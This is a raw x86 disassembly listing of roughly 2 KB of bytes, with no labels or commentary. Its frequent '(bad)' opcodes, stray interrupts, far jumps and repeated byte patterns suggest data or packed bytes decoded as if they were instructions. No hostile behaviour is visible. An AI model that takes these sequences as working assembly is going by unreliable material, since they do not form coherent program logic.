  42626a:	sbb    al,0xcd
  42626c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426273:	or     ch,0xa
  426276:	and    eax,0xcd808081
  42627b:	xor    BYTE PTR [ebx],0x81
  42627e:	or     dh,BYTE PTR [esi-0x3]
  426281:	int    0x76
  426283:	std    
  426284:	stos   BYTE PTR es:[edi],al
  426285:	test   al,0x63
  426287:	retf   
  426288:	rcr    BYTE PTR [eax+eax*4],cl
  42628b:	xchg   esi,eax
  42628c:	int    0xed
  42628e:	int    0x76
  426290:	dec    esp
  426291:	adc    ch,ch
  426293:	cmp    eax,0x5b808081
  426298:	cwde   
  426299:	call   0x2f35:0x86214966
  4262a0:	push   es
  4262a1:	mov    ecx,0xcd80804a
  4262a6:	jbe    0x4262d8
  4262a8:	inc    cx
  4262aa:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262b0:	dec    edx
  4262b1:	add    BYTE PTR [eax-0x29128937],0x37
  4262b8:	ficom  WORD PTR [ebx]
  4262ba:	pop    ebp
  4262bb:	mov    ebp,0xa25230a
  4262c0:	jbe    0x4262d3
  4262c2:	leave  
  4262c3:	jbe    0x42627a
  4262c5:	xchg   ecx,eax
  4262c6:	aaa    
  4262c7:	ficom  WORD PTR [ebx]
  4262c9:	or     dh,BYTE PTR [esi-0x43]
  4262cc:	int    0x76
  4262ce:	mov    BYTE PTR [edx],cl
  4262d0:	jbe    0x4262c7
  4262d2:	int    0x76
  4262d4:	cmc    
  4262d5:	int    0x1
  4262d7:	mov    ebp,0xcd808081
  4262dc:	or     ch,0x80
  4262df:	or     dh,BYTE PTR [esi-0x7]
  4262e2:	pop    edi
  4262e3:	jle    0x42631a
  4262e5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262ec:	mov    eax,0x4b0760a
  4262f1:	ins    DWORD PTR es:[edi],dx
  4262f2:	(bad)  
  4262f3:	mov    eax,0xcda2760a
  4262f8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262fe:	(bad)  
  4262ff:	xor    eax,0xf1cd8080
  426304:	mov    eax,0xcf19960a
  426309:	nop
  42630a:	xchg   edx,eax
  42630b:	iret   
  42630c:	sahf   
  42630d:	(bad)  
  42630e:	int    0x99
  426310:	mov    eax,0xcd1d960a
  426315:	aad    0xb8
  426317:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42631d:	mov    eax,0xcf01960a
  426322:	jno    0x426378
  426324:	int    0x3
  426326:	mov    eax,0x40be60a
  42632b:	leave  
  42632c:	xchg   ebp,eax
  42632d:	mov    eax,0xcf05e60a
  426332:	ficomp WORD PTR [eax-0x48]
  426335:	or     ah,dh
  426337:	pop    es
  426338:	mov    eax,0xb809760a
  42633d:	or     dl,dh
  42633f:	retf   0xc5cd
  426342:	mov    eax,0xb8cc760a
  426347:	or     dl,BYTE PTR [edi]
  426349:	ins    BYTE PTR es:[edi],dx
  42634a:	add    BYTE PTR [eax],al
  42634c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426353:	push   edx
  426354:	add    BYTE PTR [eax],al
  426356:	add    bh,cl
  426358:	outs   dx,BYTE PTR ds:[esi]
  426359:	add    edi,DWORD PTR [eax+0x74060a]
  42635f:	add    BYTE PTR [eax],al
  426361:	add    al,0x6d
  426363:	inc    edx
  426364:	mov    eax,0x78060a
  426369:	add    BYTE PTR [eax],al
  42636b:	iret   
  42636c:	outs   dx,BYTE PTR ds:[esi]
  42636d:	xor    BYTE PTR [eax+0x7c060a],bh
  426373:	add    BYTE PTR [eax],al
  426375:	add    al,0x6d
  426377:	xor    bh,BYTE PTR [eax+0x8a060a]
  42637d:	add    BYTE PTR [eax],al
  42637f:	mov    eax,0x8ccf0a
  426384:	add    BYTE PTR [eax],al
  426386:	int    0xc5
  426388:	mov    eax,0x8e060a
  42638d:	add    BYTE PTR [eax],al
  42638f:	int    0x76
  426391:	in     eax,dx
  426392:	int    0x8d
  426394:	adc    DWORD PTR [edi],ebp
  426396:	inc    ebp
  426397:	jge    0x42632b
  426399:	shr    ebx,cl
  42639b:	xchg   edx,eax
  42639c:	int    0x8d
  42639e:	in     eax,dx
  42639f:	int    0x96
  4263a1:	adc    ebx,eax
  4263a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263a4:	mov    esi,0xc93b4229
  4263a9:	cmp    ebx,edx
  4263ab:	shl    edx,cl
  4263ad:	sub    BYTE PTR [ebx-0x2e],dl
  4263b0:	in     al,dx
  4263b1:	outs   dx,BYTE PTR ds:[esi]
  4263b2:	iret   
  4263b3:	aam    0x76
  4263b5:	mov    al,0xb8
  4263b7:	int    0x4e
  4263b9:	das    
  4263ba:	mov    ebx,0xcbbb2f18
  4263bf:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263c2:	sti    
  4263c3:	and    DWORD PTR ds:0xf3e38080,esi
  4263c9:	shl    edx,cl
  4263cb:	das    
  4263cc:	push   ebx
  4263cd:	adc    ecx,DWORD PTR [ecx]
  4263cf:	int3   
  4263d0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263d6:	lea    esi,[ebp+0x2fbd96cd]
  4263dc:	inc    ebp
  4263dd:	jecxz  0x426371
  4263df:	shl    ebx,cl
  4263e1:	xchg   edx,eax
  4263e2:	int    0x96
  4263e4:	mov    ch,0xcd
  4263e6:	(bad)  
  4263e7:	mov    ebp,0xf73bf03b
  4263ec:	push   ebx
  4263ed:	psrlq  mm5,mm2
  4263f0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263f6:	(bad)  
  4263f7:	popa   
  4263f8:	int    0x76
  4263fa:	in     eax,dx
  4263fb:	int    0x8d
  4263fd:	adc    DWORD PTR [edi],ebp
  4263ff:	inc    ebp
  426400:	jge    0x426394
  426402:	shr    ebx,cl
  426404:	xchg   edx,eax
  426405:	int    0x8d
  426407:	in     eax,dx
  426408:	int    0x96
  42640a:	adc    DWORD PTR [ebx],edi
  42640c:	leave  
  42640d:	cmp    ebx,edx
  42640f:	shl    edx,cl
  426411:	sub    BYTE PTR [ebx-0x2e],dl
  426414:	in     al,dx
  426415:	outs   dx,BYTE PTR ds:[esi]
  426416:	iret   
  426417:	aam    0x76
  426419:	add    DWORD PTR [eax-0x44d0b133],edi
  42641f:	sbb    BYTE PTR [edi],ch
  426421:	mov    ebx,0x120c3bcb
  426426:	sti    
  426427:	and    DWORD PTR ds:0xf3e38080,esi
  42642d:	shl    edx,cl
  42642f:	das    
  426430:	push   ebx
  426431:	adc    ecx,DWORD PTR [ecx]
  426433:	int3   
  426434:	test   esp,ecx
  426436:	inc    DWORD PTR [eax]
  426438:	add    ch,cl
  42643a:	lea    esi,[ebp+0x2fbd96cd]
  426440:	inc    ebp
  426441:	jecxz  0x4263d5
  426443:	shl    ebx,cl
  426445:	xchg   edx,eax
  426446:	int    0x96
  426448:	mov    ch,0xcd
  42644a:	(bad)  
  42644b:	mov    ebp,0xf73bf03b
  426450:	push   ebx
  426451:	psrlq  mm5,mm2
  426454:	sub    BYTE PTR [edi-0x7406fb2d],al
  42645a:	(bad)  
  42645b:	popa   
  42645c:	int    0x76
  42645e:	in     eax,dx
  42645f:	int    0x8d
  426461:	adc    DWORD PTR [edi],ebp
  426463:	inc    ebp
  426464:	jge    0x4263f8
  426466:	shr    ebx,cl
  426468:	xchg   edx,eax
  426469:	int    0x8d
  42646b:	in     eax,dx
  42646c:	int    0x96
  42646e:	adc    DWORD PTR [ebx],edi
  426470:	leave  
  426471:	cmp    ebx,edx
  426473:	shl    edx,cl
  426475:	sub    BYTE PTR [ebx-0x2e],dl
  426478:	in     al,dx
  426479:	je     0x42644a
  42647b:	push   ebp
  42647c:	jbe    0x4264ea
  42647e:	add    BYTE PTR [eax],al
  426480:	add    BYTE PTR [eax-0x44d0b133],bh
  426486:	sbb    BYTE PTR [edi],ch
  426488:	mov    ebx,0x120c3bcb
  42648d:	sti    
  42648e:	and    DWORD PTR ds:0xf3e38080,esi
  426494:	shl    edx,cl
  426496:	das    
  426497:	push   ebx
  426498:	adc    ecx,DWORD PTR [ecx]
  42649a:	int3   
  42649b:	test   DWORD PTR ds:0xcd0000ff,eax
  4264a1:	lea    esi,[ebp+0x2fbd96cd]
  4264a7:	inc    ebp
  4264a8:	jecxz  0x42643c
  4264aa:	shl    ebx,cl
  4264ac:	xchg   edx,eax
  4264ad:	int    0x96
  4264af:	mov    ch,0xcd
  4264b1:	(bad)  
  4264b2:	mov    ebp,0xf73bf03b
  4264b7:	push   ebx
  4264b8:	psrlq  mm5,mm2
  4264bb:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264c1:	(bad)  
  4264c2:	mov    ebx,0xffb506cf
  4264c7:	add    BYTE PTR [eax],al
  4264c9:	or     dh,BYTE PTR [esi-0x7]
  4264cc:	int    0x76
  4264ce:	stc    
  4264cf:	pop    edi
  4264d0:	inc    esi
  4264d1:	pop    esp
  4264d2:	inc    ebp
  4264d3:	xchg   edi,eax
  4264d4:	or     cl,BYTE PTR [eax+0x79245161]
  4264da:	daa    
  4264db:	or     dh,BYTE PTR [eax-0x7c]
  4264de:	int    0x6
  4264e0:	mov    ch,0xff
  4264e2:	add    BYTE PTR [eax],al
  4264e4:	int    0x57
  4264e6:	mov    ebp,0xa0000ff
  4264eb:	(bad)  
  4264ec:	mov    ebp,0x8621d169
  4264f1:	xor    eax,0x62fd343
  4264f6:	pusha  
  4264f7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  426501:	add    BYTE PTR [eax-0x7fca76a3],0x80
  426508:	mov    eax,0xfff9060a
  42650d:	add    BYTE PTR [eax],al
  42650f:	int    0xc5
  426511:	mov    eax,0xff03060a
  426516:	add    BYTE PTR [eax],al
  426518:	pop    ebp
  426519:	es xor eax,0xab88080
  42651f:	push   es
  426520:	std    
  426521:	inc    DWORD PTR [eax]
  426523:	add    BYTE PTR [ebp-0x5d],bl
  426526:	xor    eax,0xab88080
  42652b:	push   es
  42652c:	(bad)  
  42652d:	inc    DWORD PTR [eax]
  42652f:	add    BYTE PTR [ebp+0x1e],bl
  426532:	xor    eax,0xab88080
  426537:	push   es
  426538:	add    BYTE PTR [eax],0x0
  42653b:	add    BYTE PTR [ebp*2-0x47823218],al
  426542:	or     cl,bh
  426544:	xchg   edx,eax
  426545:	add    BYTE PTR [eax],al
  426547:	add    ch,cl
  426549:	jbe    0x42657b
  42654b:	pop    edi
  42654c:	dec    ebx
  42654d:	xor    eax,0xab88080
  426552:	iret   
  426553:	test   BYTE PTR [eax],al
  426555:	add    BYTE PTR [eax],al
  426557:	add    al,0xd3
  426559:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42655f:	add    BYTE PTR [eax],al
  426561:	pop    edi
  426562:	push   esi
  426563:	xor    eax,0xab88080
  426568:	iret   
  426569:	mov    BYTE PTR [eax],al
  42656b:	add    BYTE PTR [eax],al
  42656d:	add    al,0xd3
  42656f:	pushf  
  426570:	mov    eax,0x4acf0a
  426575:	add    BYTE PTR [eax],al
  426577:	int    0xc
  426579:	mov    eax,0x4ccf0a
  42657e:	add    BYTE PTR [eax],al
  426580:	pop    edi
  426581:	add    al,0x35
  426583:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42658a:	add    BYTE PTR [eax],al
  42658c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42658f:	adc    DWORD PTR [eax-0x80],edx
  426592:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426599:	add    bl,dl
  42659b:	mov    ebp,0x151a5f92
  4265a0:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  4265a7:	add    BYTE PTR [eax],al
  4265a9:	pop    edi
  4265aa:	call   0xcf0a:0xb88080eb
  4265b1:	adc    al,0x0
  4265b3:	add    BYTE PTR [eax],al
  4265b5:	int    0x8d
  4265b7:	xor    BYTE PTR [edx+eax*1],al
  4265ba:	call   ebx
  4265bc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265c0:	or     al,BYTE PTR [esi]
  4265c2:	adc    eax,0xcd0000ff
  4265c7:	jbe    0x426615
  4265c9:	int    0x8d
  4265cb:	dec    esp
  4265cc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265cf:	mov    ebp,0xff020492
  4265d4:	shl    edx,cl
  4265d6:	sub    BYTE PTR [ebx-0x2d],dl
  4265d9:	leave  
  4265da:	add    eax,0xff1d06
  4265df:	add    BYTE PTR [eax],al
  4265e1:	add    BYTE PTR [eax+0x1506cf80],al
  4265e7:	inc    DWORD PTR [eax]
  4265e9:	add    BYTE PTR [eax-0x33],dh
  4265ec:	jbe    0x42661e
  4265ee:	int    0x8d
  4265f0:	xor    BYTE PTR [ebx],bh
  4265f2:	jns    0x4265c7
  4265f4:	mov    ebp,0xff020492
  4265f9:	shl    edx,cl
  4265fb:	sub    BYTE PTR [ebx-0x2d],dl
  4265fe:	jo     0x4265cf
  426600:	push   es
  426601:	stc    
  426602:	inc    DWORD PTR [eax]
  426604:	add    BYTE PTR [eax-0x33],dh
  426607:	jbe    0x4265fe
  426609:	int    0x1
  42660b:	cmp    eax,0xc9808081
  426610:	push   es
  426611:	sbb    BYTE PTR [eax],al
  426613:	add    BYTE PTR [eax],al
  426615:	inc    eax
  426616:	retf   
  426617:	fwait
  426618:	xor    eax,0x76cd5000
  42661d:	adc    al,0x0
  42661f:	icebp  
  426620:	or     dh,BYTE PTR [esi-0x7]
  426623:	int    0x76
  426625:	stc    
  426626:	push   es
  426627:	ins    DWORD PTR es:[edi],dx
  426628:	aam    0x4a
  42662a:	adc    dl,BYTE PTR [esi+0x68]
  42662d:	or     BYTE PTR [ebx+ecx*1],bl
  426630:	fmul   QWORD PTR [ebx-0x17]
  426633:	(bad)  
  426634:	int    0x8d
  426636:	dec    esp
  426637:	int    0x96
  426639:	dec    esp
  42663a:	sar    bh,0x3b
  42663d:	setl   BYTE PTR [ebx]
  426640:	icebp  
  426641:	shr    edx,cl
  426643:	sub    bl,dl
  426645:	jmp    0x4265d9
  426647:	push   ebx
  426648:	adc    ecx,ebp
  42664a:	xchg   esi,eax
  42664b:	cmc    
  42664c:	int    0xa2
  42664e:	and    eax,0x5e808081
  426653:	dec    edx
  426654:	das    
  426655:	push   es
  426656:	popa   
  426657:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42665d:	int    0x96
  42665f:	dec    esp
  426660:	cmp    ecx,DWORD PTR [edi]
  426662:	shr    ebx,cl
  426664:	xchg   edx,eax
  426665:	cmp    esi,ecx
  426667:	shr    edx,cl
  426669:	sub    BYTE PTR [ebx+0x13],dl
  42666c:	int    0x96
  42666e:	cmc    
  42666f:	int    0xa2
  426671:	in     al,0x81
  426673:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42667a:	int    0x96
  42667c:	dec    esp
  42667d:	cmp    ecx,DWORD PTR [edi]
  42667f:	shr    ebx,cl
  426681:	xchg   edx,eax
  426682:	cmp    esi,ecx
  426684:	shr    edx,cl
  426686:	sub    BYTE PTR [ebx+0x13],dl
  426689:	int    0x96
  42668b:	cmc    
  42668c:	int    0xa2
  42668e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426694:	pop    edi
  426695:	xor    ax,0x8080
  426699:	mov    eax,0x24cf0a
  42669e:	add    BYTE PTR [eax],al
  4266a0:	int    0xc
  4266a2:	mov    eax,0x28cf0a
  4266a7:	add    BYTE PTR [eax],al
  4266a9:	pop    edi
  4266aa:	es xor eax,0xab88080
  4266b0:	iret   
  4266b1:	sub    al,0x0
  4266b3:	add    BYTE PTR [eax],al
  4266b5:	pop    edi
  4266b6:	daa    
  4266b7:	xor    eax,0xab88080
  4266bc:	iret   
  4266bd:	xor    al,BYTE PTR [eax]
  4266bf:	add    BYTE PTR [eax],al
  4266c1:	add    al,0xd3
  4266c3:	test   eax,0x34cf0ab8
  4266c8:	add    BYTE PTR [eax],al
  4266ca:	add    BYTE PTR [edi-0x69],bl
  4266cd:	xor    eax,0xab88080
  4266d2:	iret   
  4266d3:	cmp    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [eax],al
  4266d7:	add    al,0xd3
  4266d9:	mov    dl,0xb8
  4266db:	or     cl,bh
  4266dd:	cmp    al,0x0
  4266df:	add    BYTE PTR [eax],al
  4266e1:	pop    edi
  4266e2:	fwait
  4266e3:	xor    eax,0xab88080
  4266e8:	iret   
  4266e9:	inc    eax
  4266ea:	add    BYTE PTR [eax],al
  4266ec:	add    ch,cl
  4266ee:	or     al,0xb8
  4266f0:	or     cl,bh
  4266f2:	inc    esp
  4266f3:	add    BYTE PTR [eax],al
  4266f5:	add    BYTE PTR [edi+0x17],bl
  4266f8:	xor    eax,0xab88080
  4266fd:	iret   
  4266fe:	dec    eax
  4266ff:	add    BYTE PTR [eax],al
  426701:	add    BYTE PTR [edi+0x26],bl
  426704:	pop    esi
  426705:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  42670c:	add    BYTE PTR [eax],al
  42670e:	pop    edi
  42670f:	cmp    esi,DWORD PTR [edx]
  426711:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426718:	add    BYTE PTR [eax],al
  42671a:	jns    0x426792
  42671c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42671d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42671e:	pop    edi
  42671f:	pop    esp
  426720:	adc    eax,0xab88080
  426725:	iret   
  426726:	push   esp
  426727:	add    BYTE PTR [eax],al
  426729:	add    BYTE PTR [ebx+edx*8],al
  42672c:	pop    esp
  42672d:	mov    eax,0x58cf0a
  426732:	add    BYTE PTR [eax],al
  426734:	jns    0x4267ac
  426736:	fisttp WORD PTR [ecx+0x79]
  426739:	jbe    0x4266e4
  42673b:	inc    ecx
  42673c:	jns    0x4267b4
  42673e:	loope  0x4266e3
  426740:	pop    edi
  426741:	fcom   st(4)
  426743:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42674a:	add    BYTE PTR [eax],al
  42674c:	jns    0x4267c4
  42674e:	lods   eax,DWORD PTR ds:[esi]
  42674f:	push   edi
  426750:	pop    edi
  426751:	jnp    0x4267a8
  426753:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42675a:	add    BYTE PTR [eax],al
  42675c:	jns    0x4267d4
  42675e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426762:	jmp    0x8080:0x35a15f47
  426769:	mov    eax,0x64cf0a
  42676e:	add    BYTE PTR [eax],al
  426770:	jns    0x4267e8
  426772:	in     eax,0x18
  426774:	int    0x8d
  426776:	xor    ch,cl
  426778:	xchg   esi,eax
  426779:	xor    BYTE PTR [ebx],bh
  42677b:	(bad)  
  42677d:	icebp  
  42677e:	shr    ebx,cl
  426780:	xchg   edx,eax
  426781:	shr    edx,cl
  426783:	sub    BYTE PTR [ebx+0x13],dl
  426786:	in     al,dx
  426787:	xchg   esp,eax
  426788:	int    0x96
  42678a:	xor    ch,cl
  42678c:	out    0x30,al
  42678e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426794:	stc    
  426795:	shr    ecx,cl
  426797:	sub    BYTE PTR [ebx-0x27],dl
  42679a:	xor    edx,DWORD PTR [ebx]
  42679c:	das    
  42679d:	pop    ecx
  42679e:	mov    WORD PTR [ebp-0x5b],cs
  4267a1:	int    0x96
  4267a3:	xor    ch,cl
  4267a5:	out    0x30,al
  4267a7:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4267ad:	stc    
  4267ae:	shr    ecx,cl
  4267b0:	sub    BYTE PTR [ebx-0x27],dl
  4267b3:	int    0xe6
  4267b5:	stc    
  4267b6:	add    al,0x2
  4267b8:	adc    DWORD PTR [edx],0xffffffd3
  4267bb:	fwait
  4267bc:	add    BYTE PTR [eax+0x9033380],0x8c
  4267c3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267c5:	int    0x96
  4267c7:	xor    ch,cl
  4267c9:	lea    esi,[eax]
  4267cb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267d1:	sub    bl,dl
  4267d3:	repz xchg edx,eax
  4267d5:	push   ebx
  4267d6:	jecxz  0x4267a5
  4267d8:	(bad)  
  4267d9:	stc    
  4267da:	xchg   DWORD PTR [ebx],edx
  4267dc:	int    0x96
  4267de:	xor    ch,cl
  4267e0:	out    0x30,al
  4267e2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267e8:	xchg   edx,eax
  4267e9:	shr    ecx,cl
  4267eb:	sub    BYTE PTR [ebx-0x27],dl
  4267ee:	add    al,0xd2
  4267f0:	mov    BYTE PTR [edx],cl
  4267f2:	(bad)  
  4267f3:	stc    
  4267f4:	inc    ebx
  4267f5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267fb:	int    0x96
  4267fd:	xor    BYTE PTR [ebx],bh
  4267ff:	(bad)  
  426801:	icebp  
  426802:	shr    ebx,cl
  426804:	xchg   edx,eax
  426805:	shr    edx,cl
  426807:	sub    BYTE PTR [ebx+0x13],dl
  42680a:	or     cl,bh
  42680c:	adc    eax,0xcd0000ff
  426811:	lea    ecx,[ebp+ecx*8-0x6a]
  426815:	dec    esp
  426816:	cmp    ecx,DWORD PTR [edi]
  426818:	cmp    esi,ecx
  42681a:	shr    edx,cl
  42681c:	sub    bl,dl
  42681e:	jmp    0x4267b2
  426820:	push   ebx
  426821:	adc    ecx,edi
  426823:	xchg   esi,eax
  426824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	or     dl,BYTE PTR ds:0xff1dcf
  42682b:	add    BYTE PTR [ecx+0x6b],ah
  42682e:	xor    eax,0x13cd8080
  426833:	mov    eax,0x4258d0a
  426838:	rcl    edx,cl
  42683a:	int    0xfa
  42683c:	mov    eax,0xcf29e60a
  426841:	loopne 0x4267ec
  426843:	mov    eax,0x42de60a
  426848:	leave  
  426849:	test   BYTE PTR [eax-0x304d19f6],bh
  42684f:	loopne 0x426865
  426851:	mov    eax,0x435e60a
  426856:	leave  
  426857:	loop   0x426811
  426859:	or     ah,dh
  42685b:	cmp    ebp,ecx
  42685d:	cli    
  42685e:	mov    eax,0xcd3de60a
  426863:	add    edi,DWORD PTR [eax-0x32be19f6]
  426869:	cld    
  42686a:	mov    eax,0xcd45e60a
  42686f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426875:	cli    
  426876:	mov    eax,0xcfc2e60a
  42687b:	loopne 0x4268a6
  42687d:	mov    eax,0x455e60a
  426882:	leave  
  426883:	test   BYTE PTR [eax-0x30a619f6],bh
  426889:	loopne 0x426820
  42688b:	mov    eax,0x45de60a
  426890:	leave  
  426891:	loop   0x42684b
  426893:	or     ah,dh
  426895:	popa   
  426896:	mov    eax,0xb8658d0a
  42689b:	or     dl,BYTE PTR [esi-0x47f33297]
  4268a1:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  4268a7:	int    0x96
  4268a9:	dec    esp
  4268aa:	cmp    esi,ecx
  4268ac:	cmp    ecx,DWORD PTR [edi]
  4268ae:	shr    edx,cl
  4268b0:	sub    bl,dl
  4268b2:	jmp    0x426846
  4268b4:	push   ebx
  4268b5:	adc    ecx,ebp
  4268b7:	xchg   esi,eax
  4268b8:	dec    esp
  4268b9:	int    0xe6
  4268bb:	dec    esp
  4268bc:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268c2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268c8:	jmp    0x301bbbf5
  4268cd:	mov    ebx,0xb8d93b5e
  4268d2:	or     dh,BYTE PTR [ecx]
  4268d4:	int    0x8d
  4268d6:	dec    esp
  4268d7:	int    0x96
  4268d9:	dec    esp
  4268da:	cmp    ecx,DWORD PTR [edi]
  4268dc:	cmp    esi,ecx
  4268de:	shr    ebx,cl
  4268e0:	xchg   edx,eax
  4268e1:	shr    edx,cl
  4268e3:	sub    BYTE PTR [ebx+0x13],dl
  4268e6:	int    0x96
  4268e8:	dec    esp
  4268e9:	iret   
  4268ea:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268f0:	out    0x4c,al
  4268f2:	shl    ebx,cl
  4268f4:	xchg   edx,eax
  4268f5:	cmp    edi,ecx
  4268f7:	shr    ecx,cl
  4268f9:	sub    BYTE PTR [ebx-0x27],dl
  4268fc:	das    
  4268fd:	mov    ebx,0xb8d93b5e
  426902:	or     dh,BYTE PTR [ecx]
  426904:	int    0x8d
  426906:	dec    esp
  426907:	int    0x96
  426909:	dec    esp
  42690a:	cmp    esi,ecx
  42690c:	shr    edx,cl
  42690e:	sub    BYTE PTR [ebx],bh
  426910:	psrlq  mm5,mm3
  426913:	xchg   edx,eax
  426914:	push   ebx
  426915:	adc    ecx,ebp
  426917:	xchg   esi,eax
  426918:	dec    esp
  426919:	int    0xe6
  42691b:	dec    esp
  42691c:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426922:	stc    
  426923:	shr    ecx,cl
  426925:	sub    BYTE PTR [ebx-0x27],dl
  426928:	mov    eax,0x9096cc0a
  42692d:	inc    DWORD PTR [eax]
  42692f:	add    ch,cl
  426931:	lea    ecx,[ebp+ecx*8-0x6a]
  426935:	dec    esp
  426936:	cmp    esi,ecx
  426938:	shr    edx,cl
  42693a:	sub    BYTE PTR [ebx],bh
  42693c:	psrlq  mm5,mm3
  42693f:	xchg   edx,eax
  426940:	push   ebx
  426941:	adc    ecx,ebp
  426943:	xchg   esi,eax
  426944:	dec    esp
  426945:	int    0xe6
  426947:	dec    esp
  426948:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42694e:	stc    
  42694f:	shr    ecx,cl
  426951:	sub    BYTE PTR [ebx-0x27],dl
  426954:	mov    eax,0xa496cc0a
  426959:	inc    DWORD PTR [eax]
  42695b:	add    ch,cl
  42695d:	lea    esi,[eax]
  42695f:	int    0x96
  426961:	xor    BYTE PTR [ebx],bh
  426963:	icebp  
  426964:	cmp    ecx,DWORD PTR [edi]
  426966:	shr    edx,cl
  426968:	sub    bl,dl
  42696a:	jmp    0x4268fe
  42696c:	push   ebx
  42696d:	adc    ecx,ebp
  42696f:	xchg   esi,eax
  426970:	xor    ch,cl
  426972:	out    0x30,al
  426974:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42697a:	xchg   edx,eax
  42697b:	shr    ecx,cl
  42697d:	sub    BYTE PTR [ebx-0x27],dl
  426980:	xchg   DWORD PTR [ebx],edx
  426982:	or     cl,bh
  426984:	adc    eax,0xcd0000ff
  426989:	lea    ecx,[ebp+ecx*8-0x6a]
  42698d:	dec    esp
  42698e:	int    0xe6
  426990:	mov    BYTE PTR [ebx],bh
  426992:	icebp  
  426993:	cmp    ecx,DWORD PTR [edi]
  426995:	shr    ebx,cl
  426997:	xchg   edx,eax
  426998:	shr    edx,cl
  42699a:	sub    BYTE PTR [ebx+0x13],dl
  42699d:	iret   
  42699e:	push   es
  42699f:	nop
  4269a0:	inc    DWORD PTR [eax]
  4269a2:	add    BYTE PTR [edx],cl
  4269a4:	add    eax,0xff1dcf
  4269a9:	add    bh,cl
  4269ab:	jbe    0x42697d
  4269ad:	mov    ebp,0x10d8
  4269b2:	int    0x8d
  4269b4:	xor    ch,cl
  4269b6:	xchg   esi,eax
  4269b7:	xor    al,al
  4269b9:	(bad)  
  4269ba:	cmp    ecx,DWORD PTR [edi]
  4269bc:	stos   BYTE PTR es:[edi],al
  4269bd:	cmp    ebx,ecx
  4269bf:	shr    ebx,cl
  4269c1:	xchg   edx,eax
  4269c2:	shr    edx,cl
  4269c4:	sub    BYTE PTR [ebx+0x13],dl
  4269c7:	or     al,BYTE PTR ds:0xff1dcf
  4269cd:	add    ch,cl
  4269cf:	jbe    0x426a1d
  4269d1:	int    0x8d
  4269d3:	dec    esp
  4269d4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269d7:	mov    ebp,0xd3f03b92
  4269dc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269e0:	aam    0x3c
  4269e2:	iret   
  4269e3:	push   es
  4269e4:	adc    eax,0x700000ff
  4269e9:	int    0x76
  4269eb:	xor    ch,cl
  4269ed:	lea    esi,[eax]
  4269ef:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269f2:	mov    ebp,0xd3f03b92
  4269f7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269fb:	jo     0x4269cc
  4269fd:	push   es
  4269fe:	and    al,0x0
  426a00:	add    BYTE PTR [eax],al
  426a02:	jo     0x4269d1
  426a04:	jbe    0x426a1a
  426a06:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a0d:	int    0x8d
  426a0f:	dec    esp
  426a10:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a13:	lock int 0xe6
  426a16:	mov    bl,dl
  426a18:	mov    ebp,0x28f2d392
  426a1d:	push   ebx
  426a1e:	ror    edi,cl
  426a20:	iret   
  426a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a22:	inc    DWORD PTR [eax]
  426a24:	add    BYTE PTR [edx],cl
  426a26:	int3   
  426a27:	push   es
  426a28:	sbb    eax,0xcf0000ff
  426a2d:	jbe    0x426a54
  426a2f:	mov    ebp,0xeff5
  426a34:	int    0x8d
  426a36:	xor    ch,cl
  426a38:	xchg   esi,eax
  426a39:	xor    BYTE PTR [ebx],bh
  426a3b:	psrlq  mm5,mm3
  426a3e:	xchg   edx,eax
  426a3f:	add    al,0xfb
  426a41:	call   ebx
  426a43:	jmp    0xcf05:0xa135328
  426a4a:	sbb    eax,0x610000ff
  426a4f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a55:	xor    eax,0xab88080
  426a5a:	push   es
  426a5b:	jo     0x426a5d
  426a5d:	add    BYTE PTR [eax],al
  426a5f:	iret   
  426a60:	mov    dh,BYTE PTR [eax]
  426a62:	mov    eax,0xb4cf0a
